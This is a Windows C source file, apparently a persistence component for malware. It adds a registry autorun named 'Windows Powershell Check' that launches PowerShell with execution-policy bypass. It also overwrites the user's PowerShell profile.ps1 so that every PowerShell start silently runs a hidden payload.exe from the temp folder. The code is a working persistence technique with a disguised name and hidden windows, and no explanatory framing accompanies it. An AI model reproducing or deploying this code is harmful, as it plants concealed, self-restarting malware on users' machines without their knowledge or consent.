#include "payload.h"

BOOL GetPwshProfile(char *path)
{

    SECURITY_ATTRIBUTES sa = {0};
    HANDLE hRead, hWrite = NULL;
    char buffer[MAX_PATH] = {0};
    char cmd[MAX_PATH] = {0};
    DWORD bytesRead;

    // Configure security attributes to allow handle inheritance
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Create a pipe for capturing PowerShell output
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
    {
        printf("Error creating pipe.\n");
        return FALSE;
    }

    // Prevent the read handle from being inherited
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
    ExpandEnvironmentStringsA("%ComSpec%", cmd, MAX_PATH);
    // PowerShell command
    char command[] = "/c \"%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -Command \"Write-Host -NoNewline (Split-Path \"$PROFILE\" -Parent)\"\"";

    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(STARTUPINFO);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES;

    // Create the PowerShell process
    if (!CreateProcessA(cmd, command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        printf("Error creating process.\n");
        return FALSE;
    }
    CloseHandle(hWrite);
    WaitForSingleObject(pi.hProcess, INFINITE);

    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
    {
        buffer[bytesRead] = '\0';
        printf("%s", buffer);
    }

    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (lstrlenA(buffer) > 0)
    {
        lstrcpyA(path, buffer);
        return TRUE;
    }

    return FALSE;
}
int main(int argc, char *argv[])
{
    char profile_path[MAX_PATH] = {0};
    char payload_cmd[MAX_PATH] = {0};
    char payload_path[MAX_PATH] = {0};

    DWORD nWrite = 0;
    ExpandEnvironmentStringsA("%TEMP%\\payload.exe", payload_path, MAX_PATH);

    do
    {

        if (!AddRegAutorun("Windows Powershell Check",
                           "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -executionpolicy bypass ''"))
        {
            printf("unable to add autorun reg file: %d\n", GetLastError());
            break;
        }

        if (!GetPwshProfile(profile_path))
        {
            printf("unable to get profile path!");
            break;
        }
        if (CreateDirectoryA(profile_path, NULL) == FALSE && GetLastError() != ERROR_ALREADY_EXISTS)
        {
            printf("unable to create dir: %s\n", profile_path);
            break;
        }

        sprintf(payload_cmd, "Start-Process -WindowStyle Hidden \"%s\"", payload_path);
        lstrcatA(profile_path, "\\profile.ps1");

        HANDLE hf = CreateFileA(
            profile_path,
            GENERIC_WRITE,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL);

        if (hf == INVALID_HANDLE_VALUE)
        {
            printf("unable to create file: %s\n", profile_path);
            break;
        }

        if (!WriteFile(hf, payload_cmd, lstrlenA(payload_cmd), &nWrite, NULL))
        {
            printf("unable to write file: %d\n", GetLastError());
        }

        CloseHandle(hf);

    } while (0);

    return 0;
}
